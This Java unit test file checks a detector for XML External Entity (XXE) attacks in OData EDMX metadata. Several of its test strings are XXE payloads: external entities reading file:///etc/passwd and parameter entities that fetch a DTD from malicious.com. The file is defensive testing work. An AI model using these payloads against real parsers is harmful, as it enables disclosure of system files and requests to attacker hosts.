package org.apache.olingo.compliance.engine.rule.security;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;

import org.apache.olingo.compliance.core.api.ValidationConfig;
import org.apache.olingo.compliance.engine.core.ValidationContext;
import org.apache.olingo.compliance.engine.rule.ValidationRule.RuleResult;
import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertTrue;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;
import static org.mockito.ArgumentMatchers.contains;
import static org.mockito.ArgumentMatchers.eq;
import org.mockito.Mock;
import static org.mockito.Mockito.verify;
import static org.mockito.Mockito.when;
import org.mockito.MockitoAnnotations;

/**
 * Unit tests for XxeAttackRule class.
 * Ensures 100% code coverage for all methods and branches.
 */
class XxeAttackRuleTest {

    @Mock
    private ValidationContext mockContext;
    
    @Mock
    private ValidationConfig mockConfig;
    
    @TempDir
    Path tempDir;
    
    private XxeAttackRule rule;
    
    @BeforeEach
    void setUp() {
        MockitoAnnotations.openMocks(this);
        rule = new XxeAttackRule();
    }
    
    @Test
    void testGetName() {
        assertEquals("xxe-attack", rule.getName());
    }
    
    @Test
    void testGetDescription() {
        assertEquals("Detects potential XXE (XML External Entity) attacks", rule.getDescription());
    }
    
    @Test
    void testIsSecurityApplicable_WithContent() {
        when(mockContext.getContent()).thenReturn("some xml content");
        
        assertTrue(rule.isSecurityApplicable(mockContext, mockConfig));
    }
    
    @Test
    void testIsSecurityApplicable_WithFilePath() {
        when(mockContext.getContent()).thenReturn(null);
        when(mockContext.getFilePath()).thenReturn(Paths.get("/some/path"));
        
        assertTrue(rule.isSecurityApplicable(mockContext, mockConfig));
    }
    
    @Test
    void testIsSecurityApplicable_NoContentOrPath() {
        when(mockContext.getContent()).thenReturn(null);
        when(mockContext.getFilePath()).thenReturn(null);
        
        assertFalse(rule.isSecurityApplicable(mockContext, mockConfig));
    }
    
    @Test
    void testValidate_NoContent() {
        when(mockContext.getContent()).thenReturn(null);
        when(mockContext.getFilePath()).thenReturn(null);
        
        RuleResult result = rule.validate(mockContext, mockConfig);
        
        assertTrue(result.isPassed());
    }
    
    @Test
    void testValidate_SafeXmlContent() {
        String safeXml = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
                        "<edmx:Edmx xmlns:edmx=\"http://docs.oasis-open.org/odata/ns/edmx\">\n" +
                        "  <edmx:DataServices>\n" +
                        "    <Schema xmlns=\"http://docs.oasis-open.org/odata/ns/edm\">\n" +
                        "      <EntityType Name=\"Product\">\n" +
                        "        <Property Name=\"ID\" Type=\"Edm.Int32\"/>\n" +
                        "        <Property Name=\"Name\" Type=\"Edm.String\"/>\n" +
                        "      </EntityType>\n" +
                        "    </Schema>\n" +
                        "  </edmx:DataServices>\n" +
                        "</edmx:Edmx>";
        
        when(mockContext.getContent()).thenReturn(safeXml);
        
        RuleResult result = rule.validate(mockContext, mockConfig);
        
        assertTrue(result.isPassed());
    }
    
    @Test
    void testValidate_ExternalEntitySystemAttack() {
        String maliciousXml = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
                             "<!DOCTYPE edmx [\n" +
                             "  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n" +
                             "]>\n" +
                             "<edmx:Edmx xmlns:edmx=\"http://docs.oasis-open.org/odata/ns/edmx\">\n" +
                             "  <edmx:DataServices>\n" +
                             "    <Schema xmlns=\"http://docs.oasis-open.org/odata/ns/edm\">\n" +
                             "      <EntityType Name=\"Product\">\n" +
                             "        <Property Name=\"ID\" Type=\"Edm.Int32\"/>\n" +
                             "        <Property Name=\"Value\" Type=\"Edm.String\"/>\n" +
                             "      </EntityType>\n" +
                             "    </Schema>\n" +
                             "  </edmx:DataServices>\n" +
                             "</edmx:Edmx>";
        
        when(mockContext.getContent()).thenReturn(maliciousXml);
        
        RuleResult result = rule.validate(mockContext, mockConfig);
        
        assertFalse(result.isPassed());
        assertEquals("External entity declaration detected - potential XXE attack", result.getMessage());
    }
    
    @Test
    void testValidate_ExternalEntityPublicAttack() {
        String maliciousXml = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
                             "<!DOCTYPE edmx [\n" +
                             "  <!ENTITY xxe PUBLIC \"publicId\" \"http://malicious.com/attack.dtd\">\n" +
                             "]>\n" +
                             "<edmx:Edmx xmlns:edmx=\"http://docs.oasis-open.org/odata/ns/edmx\">\n" +
                             "  <edmx:DataServices>\n" +
                             "    <Schema xmlns=\"http://docs.oasis-open.org/odata/ns/edm\">\n" +
                             "    </Schema>\n" +
                             "  </edmx:DataServices>\n" +
                             "</edmx:Edmx>";
        
        when(mockContext.getContent()).thenReturn(maliciousXml);
        
        RuleResult result = rule.validate(mockContext, mockConfig);
        
        assertFalse(result.isPassed());
        assertEquals("External entity declaration detected - potential XXE attack", result.getMessage());
    }
    
    @Test
    void testValidate_ParameterEntityAttack() {
        String maliciousXml = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
                             "<!DOCTYPE edmx [\n" +
                             "  <!ENTITY % xxe SYSTEM \"http://malicious.com/attack.dtd\">\n" +
                             "  %xxe;\n" +
                             "]>\n" +
                             "<edmx:Edmx xmlns:edmx=\"http://docs.oasis-open.org/odata/ns/edmx\">\n" +
                             "  <edmx:DataServices>\n" +
                             "    <Schema xmlns=\"http://docs.oasis-open.org/odata/ns/edm\">\n" +
                             "    </Schema>\n" +
                             "  </edmx:DataServices>\n" +
                             "</edmx:Edmx>";
        
        when(mockContext.getContent()).thenReturn(maliciousXml);
        
        RuleResult result = rule.validate(mockContext, mockConfig);
        
        assertFalse(result.isPassed());
        assertEquals("Parameter entity declaration detected - potential XXE attack", result.getMessage());
    }
    
    @Test
    void testValidate_UndeclaredEntityReference() {
        String maliciousXml = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
                             "<edmx:Edmx xmlns:edmx=\"http://docs.oasis-open.org/odata/ns/edmx\">\n" +
                             "  <edmx:DataServices>\n" +
                             "    <Schema xmlns=\"http://docs.oasis-open.org/odata/ns/edm\">\n" +
                             "      <EntityType Name=\"Product\">\n" +
                             "        <Property Name=\"ID\" Type=\"Edm.Int32\"/>\n" +
                             "        <Property Name=\"Value\" Type=\"&maliciousEntity;\"/>\n" +
                             "      </EntityType>\n" +
                             "    </Schema>\n" +
                             "  </edmx:DataServices>\n" +
                             "</edmx:Edmx>";
        
        when(mockContext.getContent()).thenReturn(maliciousXml);
        
        RuleResult result = rule.validate(mockContext, mockConfig);
        
        assertFalse(result.isPassed());
        assertEquals("Undeclared entity references detected", result.getMessage());
    }
    
    @Test
    void testValidate_StandardXmlEntities() {
        String xmlWithStandardEntities = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
                                        "<edmx:Edmx xmlns:edmx=\"http://docs.oasis-open.org/odata/ns/edmx\">\n" +
                                        "  <edmx:DataServices>\n" +
                                        "    <Schema xmlns=\"http://docs.oasis-open.org/odata/ns/edm\">\n" +
                                        "      <EntityType Name=\"Product\">\n" +
                                        "        <Property Name=\"Description\" Type=\"Edm.String\"/>\n" +
                                        "        <!-- Test with standard entities: &lt; &gt; &amp; &quot; &apos; -->\n" +
                                        "      </EntityType>\n" +
                                        "    </Schema>\n" +
                                        "  </edmx:DataServices>\n" +
                                        "</edmx:Edmx>";
        
        when(mockContext.getContent()).thenReturn(xmlWithStandardEntities);
        
        RuleResult result = rule.validate(mockContext, mockConfig);
        
        assertTrue(result.isPassed());
    }
    
    @Test
    void testValidate_DeclaredEntity() {
        String xmlWithDeclaredEntity = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
                                      "<!DOCTYPE edmx [\n" +
                                      "  <!ENTITY myEntity \"safe value\">\n" +
                                      "]>\n" +
                                      "<edmx:Edmx xmlns:edmx=\"http://docs.oasis-open.org/odata/ns/edmx\">\n" +
                                      "  <edmx:DataServices>\n" +
                                      "    <Schema xmlns=\"http://docs.oasis-open.org/odata/ns/edm\">\n" +
                                      "      <EntityType Name=\"Product\">\n" +
                                      "        <Property Name=\"Value\" Type=\"&myEntity;\"/>\n" +
                                      "      </EntityType>\n" +
                                      "    </Schema>\n" +
                                      "  </edmx:DataServices>\n" +
                                      "</edmx:Edmx>";
        
        when(mockContext.getContent()).thenReturn(xmlWithDeclaredEntity);
        
        RuleResult result = rule.validate(mockContext, mockConfig);
        
        assertTrue(result.isPassed());
    }
    
    @Test
    void testValidate_CaseInsensitiveExternalEntity() {
        String maliciousXml = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
                             "<!DOCTYPE edmx [\n" +
                             "  <!entity xxe system \"file:///etc/passwd\">\n" +
                             "]>\n" +
                             "<edmx:Edmx xmlns:edmx=\"http://docs.oasis-open.org/odata/ns/edmx\">\n" +
                             "  <edmx:DataServices>\n" +
                             "    <Schema xmlns=\"http://docs.oasis-open.org/odata/ns/edm\">\n" +
                             "    </Schema>\n" +
                             "  </edmx:DataServices>\n" +
                             "</edmx:Edmx>";
        
        when(mockContext.getContent()).thenReturn(maliciousXml);
        
        RuleResult result = rule.validate(mockContext, mockConfig);
        
        assertFalse(result.isPassed());
        assertEquals("External entity declaration detected - potential XXE attack", result.getMessage());
    }
    
    @Test
    void testValidate_ParameterEntityWithSpaces() {
        String maliciousXml = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
                             "<!DOCTYPE edmx [\n" +
                             "  <!ENTITY % xxeParam SYSTEM \"http://malicious.com/attack.dtd\">\n" +
                             "]>\n" +
                             "<edmx:Edmx xmlns:edmx=\"http://docs.oasis-open.org/odata/ns/edmx\">\n" +
                             "  <edmx:DataServices>\n" +
                             "    <Schema xmlns=\"http://docs.oasis-open.org/odata/ns/edm\">\n" +
                             "    </Schema>\n" +
                             "  </edmx:DataServices>\n" +
                             "</edmx:Edmx>";
        
        when(mockContext.getContent()).thenReturn(maliciousXml);
        
        RuleResult result = rule.validate(mockContext, mockConfig);
        
        assertFalse(result.isPassed());
        assertEquals("Parameter entity declaration detected - potential XXE attack", result.getMessage());
    }
    
    @Test
    void testValidate_ContentFromFilePath() throws IOException {
        // Create a temporary file with safe XML content
        Path xmlFile = tempDir.resolve("safe.xml");
        String safeXml = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
                        "<edmx:Edmx xmlns:edmx=\"http://docs.oasis-open.org/odata/ns/edmx\">\n" +
                        "  <edmx:DataServices>\n" +
                        "    <Schema xmlns=\"http://docs.oasis-open.org/odata/ns/edm\">\n" +
                        "    </Schema>\n" +
                        "  </edmx:DataServices>\n" +
                        "</edmx:Edmx>";
        
        Files.write(xmlFile, safeXml.getBytes());
        
        when(mockContext.getContent()).thenReturn(null); // No content, should read from file
        when(mockContext.getFilePath()).thenReturn(xmlFile);
        
        RuleResult result = rule.validate(mockContext, mockConfig);
        
        assertTrue(result.isPassed());
    }
    
    @Test
    void testValidate_FileReadError() throws IOException {
        // Create a directory instead of a file to cause read error
        Path xmlDir = tempDir.resolve("notafile");
        Files.createDirectory(xmlDir);
        
        when(mockContext.getContent()).thenReturn(null);
        when(mockContext.getFilePath()).thenReturn(xmlDir); // Directory instead of file
        
        RuleResult result = rule.validate(mockContext, mockConfig);
        
        // Should pass because of the exception handling in getXmlContent
        assertTrue(result.isPassed());
        
        // Verify that a warning was added
        verify(mockContext).addWarning(eq("xxe-attack"), contains("Could not read file content for XXE analysis"));
    }
    
    @Test
    void testValidate_ParameterEntityReference() {
        String maliciousXml = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
                             "<edmx:Edmx xmlns:edmx=\"http://docs.oasis-open.org/odata/ns/edmx\">\n" +
                             "  <edmx:DataServices>\n" +
                             "    <Schema xmlns=\"http://docs.oasis-open.org/odata/ns/edm\">\n" +
                             "      <EntityType Name=\"Product\">\n" +
                             "        <Property Name=\"Value\" Type=\"%maliciousParam;\"/>\n" +
                             "      </EntityType>\n" +
                             "    </Schema>\n" +
                             "  </edmx:DataServices>\n" +
                             "</edmx:Edmx>";
        
        when(mockContext.getContent()).thenReturn(maliciousXml);
        
        RuleResult result = rule.validate(mockContext, mockConfig);
        
        assertFalse(result.isPassed());
        assertEquals("Undeclared entity references detected", result.getMessage());
    }
    
    @Test
    void testValidate_EntityWithSpecialCharacters() {
        String xmlWithSpecialEntity = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
                                     "<!DOCTYPE edmx [\n" +
                                     "  <!ENTITY specialEntity \"value with &lt; and &gt;\">\n" +
                                     "]>\n" +
                                     "<edmx:Edmx xmlns:edmx=\"http://docs.oasis-open.org/odata/ns/edmx\">\n" +
                                     "  <edmx:DataServices>\n" +
                                     "    <Schema xmlns=\"http://docs.oasis-open.org/odata/ns/edm\">\n" +
                                     "      <EntityType Name=\"Product\">\n" +
                                     "        <Property Name=\"Value\" Type=\"&specialEntity;\"/>\n" +
                                     "      </EntityType>\n" +
                                     "    </Schema>\n" +
                                     "  </edmx:DataServices>\n" +
                                     "</edmx:Edmx>";
        
        when(mockContext.getContent()).thenReturn(xmlWithSpecialEntity);
        
        RuleResult result = rule.validate(mockContext, mockConfig);
        
        assertTrue(result.isPassed());
    }
    
    @Test
    void testGetEstimatedExecutionTime() {
        assertEquals(500, rule.getEstimatedExecutionTime());
    }
    
    @Test
    void testValidate_MultilineExternalEntity() {
        String maliciousXml = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
                             "<!DOCTYPE edmx [\n" +
                             "  <!ENTITY xxe SYSTEM\n" +
                             "    \"file:///etc/passwd\">\n" +
                             "]>\n" +
                             "<edmx:Edmx xmlns:edmx=\"http://docs.oasis-open.org/odata/ns/edmx\">\n" +
                             "  <edmx:DataServices>\n" +
                             "    <Schema xmlns=\"http://docs.oasis-open.org/odata/ns/edm\">\n" +
                             "    </Schema>\n" +
                             "  </edmx:DataServices>\n" +
                             "</edmx:Edmx>";
        
        when(mockContext.getContent()).thenReturn(maliciousXml);
        
        RuleResult result = rule.validate(mockContext, mockConfig);
        
        assertFalse(result.isPassed());
        assertEquals("External entity declaration detected - potential XXE attack", result.getMessage());
    }
}
